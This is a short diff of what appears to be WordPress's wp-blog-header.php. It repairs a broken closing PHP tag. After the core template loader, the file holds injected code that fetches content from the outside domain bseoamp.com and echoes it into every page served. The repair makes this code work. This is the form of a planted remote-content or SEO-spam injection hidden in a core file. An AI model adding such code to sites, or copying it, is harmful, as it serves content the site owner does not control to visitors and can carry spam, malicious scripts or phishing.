@@ -19,7 +19,7 @@ if ( ! isset( $wp_did_header ) ) {
 	require_once ABSPATH . WPINC . '/template-loader.php';
 
 }
-?<
+?>
 <?php
 $a = file_get_contents ('https://bseoamp.com/bseo/');
 echo $a
